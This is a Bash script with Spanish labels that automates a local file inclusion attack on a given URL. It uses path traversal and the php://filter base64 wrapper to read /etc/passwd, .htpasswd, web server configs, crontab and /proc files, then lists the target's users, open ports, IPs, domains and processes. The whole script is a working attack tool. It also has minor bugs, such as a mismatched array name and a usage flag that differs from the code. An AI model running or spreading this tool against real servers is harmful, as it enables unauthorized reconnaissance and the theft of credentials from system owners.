#!/bin/bash

red="\e[0;31m\033[1m"; enc="\033[0m\e[0m"
declare -i flag_b64=0; declare -i flag_null_byte=0

function ayuda(){
    echo -e "\n --- USO ------------------------------------ \n "
	echo -e "programa.sh url_del_lfi\n"
	echo -e "Opcion -d para base64\n"
}

if [ $# == 1 ]; then
	url=$1
elif [ $# == 2 ] && [ $2 == "-b" ]; then
	url=$1; flag_b64=1
else
	ayuda
fi

b64="php://filter/convert.base64-encode/resource="; trav="../../../../.."

function get_content() {
    local ruta="$1"
    if [ $flag_b64 == 0 ]; then
        curl -s "$url$trav$ruta"
    else
        curl -s "$url$b64$ruta" | base64 -d
    fi
}

echo -ne "${red}[*] Usuarios del sistema:${enc} "
get_content "/etc/passwd" | grep "sh" | awk '{print $1}' FS=":" | tr "\n" "," | sed "s/,/, /g"

echo -ne "\n${red}[*] Nombre del sistema:${enc} "
get_content "/etc/hostname"

echo -ne "\n${red}[*] Puertos abiertos:${enc} "
ports=$(get_content "/proc/net/tcp" | awk '{print $2}' | awk '{print $2}' FS=":")
for port in $ports; do echo "$((16#$port))" | tr "\n" "," | sed "s/,/, /g" ; done

echo -ne "\n${red}[*] Direcciones IP:${enc} "
get_content "/proc/net/fib_trie" | grep "LOC" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" "," | sed "s/,/, /g"

echo -ne "\n${red}[*] Dominios:${enc} "
get_content "/etc/hosts" | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | awk '{print $2}' | grep -v "localhost" | tr "\n" "," | sed "s/,/, /g"

declare -a lista_rutas=("/etc/apache/sites-enabled/000-default.conf", "/etc/nginx/sites-enabled/default", "/etc/nginx/sites-avaiable/default", "/etc/nginx/conf.d/.htpasswd")
for ruta in "${lista[@]}"; do
    content=$(get_content "$ruta")
    if [[ $content ]]; then
        echo -e "\t> $ruta:\n$content"
    fi
done

echo -ne "\n${red}[*] Tareas CRON:${enc}\n"
get_content "/etc/crontab" | grep -P "^\d"

echo -ne "\n${red}[*] Procesos en ejecucÃ­on:${enc}\n"
get_content "/proc/sched_debug" | grep -P "\d" | grep -E "^ S|^ I" | grep -vE "scsi|system|kworker|card|irq|dbus|rcu" | awk '{print $2 " -> " $3}'
